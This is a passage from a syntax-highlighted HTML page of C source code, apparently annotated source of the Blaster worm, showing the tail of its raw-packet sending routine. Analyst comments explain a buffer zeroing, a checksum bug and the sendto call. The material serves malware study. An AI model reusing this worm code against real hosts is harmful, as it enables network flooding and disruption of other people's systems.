</span><span class="sc1">/* I have no idea what's going on here. The assembly code
* zeroes out a bit of memory near the buffer. I don't know
* if it is trying to zero out a real variable that happens
* to be at the end of the buffer, or if it is trying to zero
* out part of the buffer itself. */</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">)-</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">)-</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* Major bug here: the worm writer incorrectly calculates the
* IP checksum over the entire packet. This is incorrect --
* the IP checksum is just for the IP header itself, not for
* the TCP header or data. However, Windows fixes the checksum
* anyway, so the bug doesn't appear in the actual packets
* themselves.
*/</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">checksum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blaster_checksum</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* Copy the header over again. The reason for this is simply to
* copy over the checksum that was just calculated above, but
* it's easier doing this for the programmer rather than
* figuring out the exact offset where the checksum is
* located */</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* Send the packet */</span><span class="sc0">
</span><span class="sc11">sendto</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">to</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
